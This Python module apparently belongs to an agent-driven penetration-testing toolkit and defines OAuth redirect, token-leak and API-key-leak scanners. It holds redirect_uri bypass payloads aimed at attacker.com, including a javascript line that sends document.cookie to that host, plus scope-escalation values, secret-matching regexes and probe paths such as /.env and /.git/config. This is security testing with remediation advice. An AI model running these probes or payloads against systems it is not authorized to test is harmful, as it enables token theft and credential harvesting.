"""
OAuth 2.0, Token Leak & API Key Detection Tools

Implements three agent tools for OAuth and token security testing:

  OAuthFlowTool       — test OAuth 2.0 flows for redirect_uri manipulation,
                        scope escalation, state parameter absence (CSRF), and
                        PKCE bypass.
  OAuthTokenLeakTool  — detect OAuth token leakage via Referer headers, URL
                        fragments, open redirects, and browser history.
  APIKeyLeakTool      — detect API keys in HTTP responses, JavaScript files,
                        error messages, and common configuration paths.

OWASP Mapping: A01:2021-Broken Access Control / A02:2021-Cryptographic Failures
"""

from __future__ import annotations

import logging
import re
import urllib.parse
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import truncate_output
from app.mcp.base_server import MCPClient

logger = logging.getLogger(__name__)

DEFAULT_CURL_SERVER_URL = "http://kali-tools:8001"

OWASP_OAUTH_TAG = "A01:2021-Broken Access Control (OAuth 2.0 / Token Leakage)"
OWASP_APIKEY_TAG = "A02:2021-Cryptographic Failures (API Key Exposure)"


# ---------------------------------------------------------------------------
# OAuth redirect_uri bypass payloads
# ---------------------------------------------------------------------------

_REDIRECT_URI_BYPASS_VARIANTS: List[str] = [
    "https://attacker.com",
    "https://attacker.com/callback",
    "https://attacker.com@legitimate.com",
    "https://legitimate.com.attacker.com",
    "https://legitimate.com/callback/../../../attacker.com",
    "https://legitimate.com/callback%0d%0aHost: attacker.com",
    "https://legitimate.com/callback?redirect=https://attacker.com",
    "//attacker.com",
    "https://legitimate.com/callback#https://attacker.com",
    "javascript:fetch('https://attacker.com/?c='+document.cookie)",
]

# Common OAuth endpoints to discover
_OAUTH_DISCOVERY_PATHS: List[str] = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/authorize",
    "/oauth2/authorize",
    "/auth/authorize",
    "/connect/authorize",
    "/api/oauth/authorize",
    "/oauth/token",
    "/oauth2/token",
    "/auth/token",
    "/connect/token",
]

# Common OAuth scope values to escalate to
_SCOPE_ESCALATION_VALUES: List[str] = [
    "admin", "superuser", "read:admin", "write:admin",
    "openid profile email admin", "openid profile email offline_access",
    "*", "all", "root",
]


class OAuthRisk(str, Enum):
    """Risk level of an OAuth finding."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    NONE = "none"


# ---------------------------------------------------------------------------
# OAuthFlowTool
# ---------------------------------------------------------------------------


class OAuthFlowTool(BaseTool):
    """Test OAuth 2.0 authorization flows for common vulnerabilities.

    Tests performed:
    1. redirect_uri manipulation — arbitrary URL substitution
    2. State parameter — missing CSRF protection
    3. Scope escalation — requesting elevated permissions
    4. PKCE bypass — code_challenge omission or downgrade
    5. Authorization code replay — reusing an auth code

    OWASP A01:2021-Broken Access Control
    """

    def __init__(
        self,
        server_url: str = DEFAULT_CURL_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="oauth_flow",
            description=(
                "Test OAuth 2.0 authorization flows: redirect_uri manipulation, "
                "missing state parameter (CSRF), scope escalation, and PKCE bypass. "
                "Probes the authorization endpoint and reports exploitable vectors. "
                "OWASP A01:2021-Broken Access Control."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "authorization_url": {
                        "type": "string",
                        "description": (
                            "OAuth authorization endpoint URL "
                            "(e.g. https://example.com/oauth/authorize)."
                        ),
                    },
                    "client_id": {
                        "type": "string",
                        "description": "OAuth client_id of the application being tested.",
                        "default": "",
                    },
                    "redirect_uri": {
                        "type": "string",
                        "description": "Legitimate redirect_uri registered for the client.",
                        "default": "",
                    },
                    "scope": {
                        "type": "string",
                        "description": "Scope(s) normally requested (e.g. 'openid profile').",
                        "default": "openid profile",
                    },
                    "test_redirect_bypass": {
                        "type": "boolean",
                        "description": "Test redirect_uri manipulation attacks.",
                        "default": True,
                    },
                    "test_state_parameter": {
                        "type": "boolean",
                        "description": "Test for missing or weak state parameter.",
                        "default": True,
                    },
                    "test_scope_escalation": {
                        "type": "boolean",
                        "description": "Test scope escalation to admin-level scopes.",
                        "default": True,
                    },
                },
                "required": ["authorization_url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        authorization_url: str,
        client_id: str = "",
        redirect_uri: str = "",
        scope: str = "openid profile",
        test_redirect_bypass: bool = True,
        test_state_parameter: bool = True,
        test_scope_escalation: bool = True,
        **kwargs: Any,
    ) -> str:
        findings: List[Dict[str, Any]] = []

        # ── Test 1: State parameter (CSRF) ─────────────────────────────────
        if test_state_parameter:
            # Request authorization URL without state parameter
            params = _build_auth_params(client_id, redirect_uri, scope, state=None)
            resp = await self._fetch_url(authorization_url, params)
            status = resp.get("status_code", 0)
            body = _get_body(resp)
            # If server responds with 200/302 and no error about missing state
            if status in (200, 302) and "state" not in body.lower():
                findings.append({
                    "type": "missing_state_parameter",
                    "risk": OAuthRisk.HIGH.value,
                    "detail": (
                        "Authorization request accepted without 'state' parameter. "
                        "No CSRF protection on OAuth flow."
                    ),
                })

        # ── Test 2: redirect_uri manipulation ─────────────────────────────
        if test_redirect_bypass:
            for bypass_uri in _REDIRECT_URI_BYPASS_VARIANTS[:5]:
                params = _build_auth_params(client_id, bypass_uri, scope)
                resp = await self._fetch_url(authorization_url, params)
                status = resp.get("status_code", 0)
                body = _get_body(resp)
                # Server should reject with 400 or error page
                if status in (200, 302) and "error" not in body.lower():
                    findings.append({
                        "type": "redirect_uri_bypass",
                        "risk": OAuthRisk.CRITICAL.value,
                        "detail": f"Server accepted unauthorized redirect_uri: {bypass_uri}",
                        "bypass_uri": bypass_uri,
                    })

        # ── Test 3: Scope escalation ───────────────────────────────────────
        if test_scope_escalation:
            for escalated_scope in _SCOPE_ESCALATION_VALUES[:4]:
                params = _build_auth_params(client_id, redirect_uri, escalated_scope)
                resp = await self._fetch_url(authorization_url, params)
                status = resp.get("status_code", 0)
                body = _get_body(resp)
                if status in (200, 302) and "invalid_scope" not in body.lower() and "error" not in body.lower():
                    findings.append({
                        "type": "scope_escalation",
                        "risk": OAuthRisk.HIGH.value,
                        "detail": f"Server accepted elevated scope: '{escalated_scope}'",
                        "escalated_scope": escalated_scope,
                    })
                    break  # One success is enough

        return self._format(authorization_url, findings)

    async def _fetch_url(
        self, base_url: str, params: Dict[str, str]
    ) -> Dict[str, Any]:
        full_url = base_url + "?" + urllib.parse.urlencode(params) if params else base_url
        try:
            return await self._client.call_tool(
                "execute_curl",
                {"url": full_url, "method": "GET", "follow_redirects": False},
            )
        except Exception as exc:
            logger.debug("OAuthFlow fetch failed: %s", exc)
            return {"success": False, "error": str(exc)}

    def _format(self, url: str, findings: List[Dict[str, Any]]) -> str:
        lines = [
            f"[oauth_flow] OAuth 2.0 Security Test: {url}",
            f"  Findings: {len(findings)}",
            "",
        ]
        if findings:
            critical = any(f["risk"] == "critical" for f in findings)
            risk_label = "CRITICAL" if critical else "HIGH"
            lines += [
                f"  ⚠ OAUTH VULNERABILITY — Risk: {risk_label}",
                f"  OWASP: {OWASP_OAUTH_TAG}",
                "",
                "── Findings ───────────────────────────────",
            ]
            for f in findings:
                lines += [
                    f"  [{f['risk'].upper()}] {f['type']}",
                    f"    {f['detail']}",
                    "",
                ]
            lines += [
                "── Remediation ────────────────────────────",
                "  1. Enforce strict redirect_uri whitelist matching (exact match, no wildcards)",
                "  2. Require and validate the 'state' parameter on every authorization request",
                "  3. Implement PKCE (RFC 7636) for all public clients",
                "  4. Validate and restrict granted scopes to the minimum required",
            ]
        else:
            lines += [
                "  ✓ No OAuth vulnerabilities detected in tested scenarios.",
                f"  OWASP: {OWASP_OAUTH_TAG}",
            ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# OAuthTokenLeakTool
# ---------------------------------------------------------------------------

# Patterns that suggest a token has leaked into a URL or header
_TOKEN_LEAK_PATTERNS: List[Tuple[str, str]] = [
    (r"access_token=([A-Za-z0-9\-_\.]+)", "access_token in URL fragment/query"),
    (r"id_token=([A-Za-z0-9\-_\.]{20,})", "id_token in URL"),
    (r"Bearer ([A-Za-z0-9\-_\.]{20,})", "Bearer token in Referer/URL"),
    (r"token=([A-Za-z0-9\-_\.]{20,})", "token in URL query"),
    (r"code=([A-Za-z0-9\-_]{10,})", "authorization code in URL (replay risk)"),
]

_REFERER_LEAK_PATHS: List[str] = [
    "/logout",
    "/dashboard",
    "/settings",
    "/profile",
    "/api/me",
]


class OAuthTokenLeakTool(BaseTool):
    """Detect OAuth token leakage via Referer headers and URL fragments.

    Checks:
    1. Referer header leaking tokens to third-party pages
    2. access_token in URL fragment (Implicit flow legacy)
    3. Authorization code leakage via Referer on redirect
    4. Token in browser history (URL query parameter exposure)
    5. Open redirect chaining for token theft

    OWASP A01:2021-Broken Access Control
    """

    def __init__(
        self,
        server_url: str = DEFAULT_CURL_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="oauth_token_leak",
            description=(
                "Detect OAuth/OIDC token leakage: tokens in URL fragments, Referer headers, "
                "query parameters, and via open redirect chaining. Scans response headers "
                "and body for access_token, id_token, Bearer tokens, and authorization codes. "
                "OWASP A01:2021."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "base_url": {
                        "type": "string",
                        "description": "Base URL of the application (e.g. https://example.com).",
                    },
                    "callback_url": {
                        "type": "string",
                        "description": "OAuth callback/redirect_uri URL to analyse for token exposure.",
                        "default": "",
                    },
                    "cookies": {
                        "type": "string",
                        "description": "Session cookies for the authenticated user.",
                        "default": "",
                    },
                    "check_paths": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Additional paths to scan for token leakage.",
                        "default": [],
                    },
                },
                "required": ["base_url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        base_url: str,
        callback_url: str = "",
        cookies: str = "",
        check_paths: Optional[List[str]] = None,
        **kwargs: Any,
    ) -> str:
        base_headers: Dict[str, str] = {}
        if cookies:
            base_headers["Cookie"] = cookies

        findings: List[Dict[str, Any]] = []
        scan_paths = _REFERER_LEAK_PATHS + list(check_paths or [])

        for path in scan_paths[:8]:
            url = base_url.rstrip("/") + path
            resp = await self._fetch(url, base_headers)
            body = _get_body(resp)
            resp.get("request_headers", {})
            resp_headers = resp.get("headers", {})

            # Scan response body for token patterns
            for pattern, label in _TOKEN_LEAK_PATTERNS:
                m = re.search(pattern, body)
                if m:
                    findings.append({
                        "location": f"Response body ({path})",
                        "type": label,
                        "evidence": m.group(0)[:80],
                        "risk": "critical",
                    })

            # Scan Location header for token fragments
            location = resp_headers.get("Location", resp_headers.get("location", ""))
            if location:
                for pattern, label in _TOKEN_LEAK_PATTERNS:
                    m = re.search(pattern, location)
                    if m:
                        findings.append({
                            "location": f"Location header ({path})",
                            "type": label,
                            "evidence": m.group(0)[:80],
                            "risk": "critical",
                        })

        # Check callback URL if provided
        if callback_url:
            for pattern, label in _TOKEN_LEAK_PATTERNS:
                m = re.search(pattern, callback_url)
                if m:
                    findings.append({
                        "location": "callback_url",
                        "type": label,
                        "evidence": m.group(0)[:80],
                        "risk": "critical",
                    })

        return self._format(base_url, findings)

    async def _fetch(self, url: str, headers: Dict[str, str]) -> Dict[str, Any]:
        try:
            return await self._client.call_tool(
                "execute_curl",
                {"url": url, "method": "GET", "headers": headers, "follow_redirects": False},
            )
        except Exception as exc:
            logger.debug("OAuthTokenLeak fetch failed: %s", exc)
            return {"success": False, "error": str(exc)}

    def _format(self, base_url: str, findings: List[Dict[str, Any]]) -> str:
        lines = [
            f"[oauth_token_leak] Token Leakage Scan: {base_url}",
            f"  Leakage findings: {len(findings)}",
            "",
        ]
        if findings:
            lines += [
                "  ⚠ TOKEN LEAKAGE DETECTED — Risk: CRITICAL",
                f"  OWASP: {OWASP_OAUTH_TAG}",
                "",
                "── Leak Locations ─────────────────────────",
            ]
            for f in findings:
                lines += [
                    f"  [{f['risk'].upper()}] {f['type']}",
                    f"    Location: {f['location']}",
                    f"    Evidence: {f['evidence']}",
                    "",
                ]
            lines += [
                "── Remediation ────────────────────────────",
                "  1. Use Authorization Code + PKCE flow — never Implicit flow",
                "  2. Store tokens in HttpOnly cookies, not URL fragments or localStorage",
                "  3. Set Referrer-Policy: no-referrer on pages that handle tokens",
                "  4. Implement short token lifetimes and token binding where possible",
            ]
        else:
            lines += [
                "  ✓ No token leakage detected in scanned paths.",
                f"  OWASP: {OWASP_OAUTH_TAG}",
            ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# APIKeyLeakTool
# ---------------------------------------------------------------------------

# Patterns matching common API key formats in responses
_API_KEY_PATTERNS: List[Tuple[str, str, str]] = [
    # (pattern, label, risk)
    (r"(?i)api[_\-]?key[\"'\s:=]+([A-Za-z0-9\-_]{20,})", "Generic API Key", "critical"),
    (r"(?i)secret[_\-]?key[\"'\s:=]+([A-Za-z0-9\-_]{16,})", "Secret Key", "critical"),
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key ID", "critical"),
    (r"(?i)aws[_\-]?secret[\"'\s:=]+([A-Za-z0-9+/]{40})", "AWS Secret Access Key", "critical"),
    (r"ghp_[A-Za-z0-9]{36}", "GitHub Personal Access Token", "critical"),
    (r"ghs_[A-Za-z0-9]{36}", "GitHub App Token", "critical"),
    (r"sk-[A-Za-z0-9]{48}", "OpenAI API Key", "critical"),
    (r"(?i)stripe[_\-]?(?:secret|api)[_\-]?key[\"'\s:=]+sk_(?:live|test)_[A-Za-z0-9]{24,}", "Stripe Secret Key", "critical"),
    (r"Bearer [A-Za-z0-9\-_\.]{40,}", "Bearer Token", "high"),
    (r"(?i)auth[_\-]?token[\"'\s:=]+([A-Za-z0-9\-_\.]{20,})", "Auth Token", "high"),
    (r"(?i)access[_\-]?token[\"'\s:=]+([A-Za-z0-9\-_\.]{20,})", "Access Token", "high"),
    (r"(?i)private[_\-]?key[\"'\s:=]+([A-Za-z0-9\-_\.]{16,})", "Private Key Fragment", "high"),
    (r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----", "PEM Private Key", "critical"),
    (r"(?i)(?:password|passwd|pwd)[\"'\s:=]+([^\s\"']{8,})", "Hardcoded Password", "high"),
    (r"(?i)database[_\-]?url[\"'\s:=]+((?:postgres|mysql|mongodb)[^\s\"']+)", "Database URL", "critical"),
]

# Common paths where API keys or config files may be exposed
_API_KEY_SCAN_PATHS: List[str] = [
    "/",
    "/js/app.js",
    "/js/main.js",
    "/js/bundle.js",
    "/static/js/main.js",
    "/config.js",
    "/config.json",
    "/.env",
    "/api/config",
    "/api/settings",
    "/debug",
    "/info",
    "/actuator/env",       # Spring Boot
    "/actuator/configprops",
    "/__debug__",
    "/wp-json/wp/v2/users",  # WordPress
    "/phpmyadmin/",
    "/server-status",
    "/.git/config",
    "/robots.txt",
    "/sitemap.xml",
]


class APIKeyLeakTool(BaseTool):
    """Detect API keys and secrets leaked in HTTP responses and JavaScript files.

    Scans:
    - Homepage and common JS bundle paths
    - /config.json, /.env, /api/settings
    - Error messages triggered by malformed requests
    - Spring Boot actuator endpoints
    - Git repository metadata paths

    OWASP A02:2021-Cryptographic Failures
    """

    def __init__(
        self,
        server_url: str = DEFAULT_CURL_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="api_key_leak",
            description=(
                "Detect leaked API keys, secrets, and credentials in HTTP responses, "
                "JavaScript bundles, config files, debug endpoints, and error pages. "
                "Matches 15+ patterns: AWS keys, GitHub tokens, OpenAI keys, Stripe keys, "
                "hardcoded passwords, PEM keys, and database URLs. OWASP A02:2021."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "base_url": {
                        "type": "string",
                        "description": "Base URL of the application to scan (e.g. https://example.com).",
                    },
                    "cookies": {
                        "type": "string",
                        "description": "Session cookies (for authenticated scanning).",
                        "default": "",
                    },
                    "extra_paths": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Additional URL paths to scan.",
                        "default": [],
                    },
                    "trigger_errors": {
                        "type": "boolean",
                        "description": "Send malformed requests to trigger verbose error messages.",
                        "default": True,
                    },
                },
                "required": ["base_url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        base_url: str,
        cookies: str = "",
        extra_paths: Optional[List[str]] = None,
        trigger_errors: bool = True,
        **kwargs: Any,
    ) -> str:
        base_headers: Dict[str, str] = {}
        if cookies:
            base_headers["Cookie"] = cookies

        findings: List[Dict[str, Any]] = []
        extra_paths_list = list(extra_paths or [])
        # Always include extra paths (up to 5 additional) beyond the base scan paths
        base_paths = _API_KEY_SCAN_PATHS[:20]
        scan_paths = base_paths + extra_paths_list[:5]

        for path in scan_paths:
            url = base_url.rstrip("/") + path
            resp = await self._fetch(url, "GET", base_headers)
            if not resp.get("success"):
                continue
            body = _get_body(resp)
            if not body:
                continue
            status = resp.get("status_code", 0)
            # Only scan 200 responses (and 500 for error leaks)
            if status not in (200, 500):
                continue
            for pattern, label, risk in _API_KEY_PATTERNS:
                for m in re.finditer(pattern, body):
                    matched = m.group(0)[:80]
                    # De-duplicate
                    if not any(f["evidence"] == matched for f in findings):
                        findings.append({
                            "path": path,
                            "type": label,
                            "risk": risk,
                            "evidence": matched,
                            "url": url,
                        })

        # ── Trigger error pages ────────────────────────────────────────────
        if trigger_errors:
            error_payloads = [
                (base_url.rstrip("/") + "/api/", "GET", {}),
                (base_url.rstrip("/") + "/%UNKNOWN%", "GET", {}),
                (base_url.rstrip("/") + "/api/data", "POST", {"Content-Type": "text/plain"}),
            ]
            for err_url, err_method, err_headers in error_payloads:
                hdrs = {**base_headers, **err_headers}
                resp = await self._fetch(err_url, err_method, hdrs)
                body = _get_body(resp)
                for pattern, label, risk in _API_KEY_PATTERNS:
                    m = re.search(pattern, body)
                    if m:
                        matched = m.group(0)[:80]
                        if not any(f["evidence"] == matched for f in findings):
                            findings.append({
                                "path": f"[error page] {err_url}",
                                "type": label,
                                "risk": risk,
                                "evidence": matched,
                                "url": err_url,
                            })

        return self._format(base_url, findings)

    async def _fetch(
        self,
        url: str,
        method: str,
        headers: Dict[str, str],
        body: str = "",
    ) -> Dict[str, Any]:
        try:
            params: Dict[str, Any] = {
                "url": url,
                "method": method,
                "headers": headers,
                "follow_redirects": False,
            }
            if body:
                params["body"] = body
            return await self._client.call_tool("execute_curl", params)
        except Exception as exc:
            logger.debug("APIKeyLeak fetch failed: %s", exc)
            return {"success": False, "error": str(exc)}

    def _format(self, base_url: str, findings: List[Dict[str, Any]]) -> str:
        lines = [
            f"[api_key_leak] API Key & Secret Scan: {base_url}",
            f"  Secrets found: {len(findings)}",
            "",
        ]
        if findings:
            critical = any(f["risk"] == "critical" for f in findings)
            risk_label = "CRITICAL" if critical else "HIGH"
            lines += [
                f"  ⚠ SECRETS EXPOSED — Risk: {risk_label}",
                f"  OWASP: {OWASP_APIKEY_TAG}",
                "",
                "── Leaked Secrets ─────────────────────────",
            ]
            for f in findings:
                lines += [
                    f"  [{f['risk'].upper()}] {f['type']}",
                    f"    Path:     {f['path']}",
                    f"    Evidence: {f['evidence']}",
                    "",
                ]
            lines += [
                "── Remediation ────────────────────────────",
                "  1. Rotate ALL exposed credentials immediately",
                "  2. Never commit secrets to source control — use environment variables or secret managers",
                "  3. Add .env, *.key, config.json to .gitignore",
                "  4. Implement secret scanning in CI/CD pipeline (git-secrets, truffleHog)",
                "  5. Disable debug/actuator endpoints in production",
            ]
        else:
            lines += [
                "  ✓ No API keys or secrets detected in scanned paths.",
                f"  OWASP: {OWASP_APIKEY_TAG}",
            ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------


def _get_body(result: Dict[str, Any]) -> str:
    """Safely extract body string from a curl result dict."""
    body = result.get("body", "")
    if isinstance(body, dict):
        import json
        return json.dumps(body)
    return str(body) if body else ""


def _build_auth_params(
    client_id: str,
    redirect_uri: str,
    scope: str,
    state: Optional[str] = "univex_test_state",
    response_type: str = "code",
) -> Dict[str, str]:
    """Build OAuth authorization request query parameters."""
    params: Dict[str, str] = {
        "response_type": response_type,
        "scope": scope,
    }
    if client_id:
        params["client_id"] = client_id
    if redirect_uri:
        params["redirect_uri"] = redirect_uri
    if state is not None:
        params["state"] = state
    return params


__all__ = [
    "OAuthFlowTool",
    "OAuthTokenLeakTool",
    "APIKeyLeakTool",
    "OAuthRisk",
    "OWASP_OAUTH_TAG",
    "OWASP_APIKEY_TAG",
    "_REDIRECT_URI_BYPASS_VARIANTS",
    "_SCOPE_ESCALATION_VALUES",
    "_TOKEN_LEAK_PATTERNS",
    "_API_KEY_PATTERNS",
    "_API_KEY_SCAN_PATHS",
    "_OAUTH_DISCOVERY_PATHS",
    "_get_body",
    "_build_auth_params",
]
